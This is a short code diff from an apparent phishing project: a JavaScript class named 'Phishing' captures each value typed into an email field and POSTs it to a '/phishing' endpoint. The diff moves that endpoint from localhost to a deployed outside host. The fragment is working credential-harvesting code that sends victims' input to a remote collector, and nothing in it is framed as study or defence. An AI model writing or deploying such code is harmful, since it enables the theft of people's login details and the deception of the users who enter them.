@@ -27,7 +27,7 @@ class Phishing {
     if (name == "email") {
       this.emailId = setTimeout(() => {
         console.log(`${name}`, event.target.value);
-        fetch("http://localhost:5000/phishing", {
+        fetch("https://swag-v2-backend.onrender.com/phishing", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
